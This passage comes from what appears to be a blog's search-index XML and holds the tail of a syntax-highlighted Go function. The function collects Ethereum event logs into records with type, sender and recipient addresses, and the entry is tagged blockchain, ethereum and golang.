class="string">&quot;unknow&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    logsInfo = <span class="built_in">append</span>(logsInfo, LogInfo&#123;</span><br><span class="line">      <span class="comment">//Log: vLog,</span></span><br><span class="line">      LogType:     logType,</span><br><span class="line">      FromAddress: common.HexToAddress(vLog.Topics[<span class="number">1</span>].Hex()).Hex(),</span><br><span class="line">      ToAddress:   common.HexToAddress(vLog.Topics[<span class="number">2</span>].Hex()).Hex(),</span><br><span class="line">      ParseData:   strData,</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> logsInfo, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>ethereum</tag>
        <tag>golang</tag>
      </tags>
  </entry>
</search>
